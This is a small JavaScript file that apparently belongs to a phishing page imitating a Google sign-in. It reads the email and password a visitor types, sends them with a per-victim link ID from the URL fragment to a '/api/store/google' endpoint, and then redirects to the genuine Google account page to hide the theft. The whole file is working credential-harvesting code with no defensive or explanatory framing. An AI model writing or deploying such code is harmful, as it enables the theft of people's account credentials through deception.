const Password = document.getElementById('password')
const Checkbox = document.querySelector("#show");
const submitB = document.getElementById('submit-b');
const emailElem = document.getElementById('email');
const loc = window.location.href;
const linkID = loc.split('#')[1];

Checkbox.addEventListener('click',function(){
  const type =Password.getAttribute("type")=== "password" ? "text" : "password";
  Password.setAttribute("type",type);
});

submitB.addEventListener('click', e => {
    e.preventDefault();

    const password = Password.value;
    const email = emailElem.value;

    fetch('/api/store/google', {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: email,
            password: password,
            linkID: linkID
        })
    }).then(res => res.json()).then(res => {
        window.location.replace('https://myaccount.google.com/')
    })
})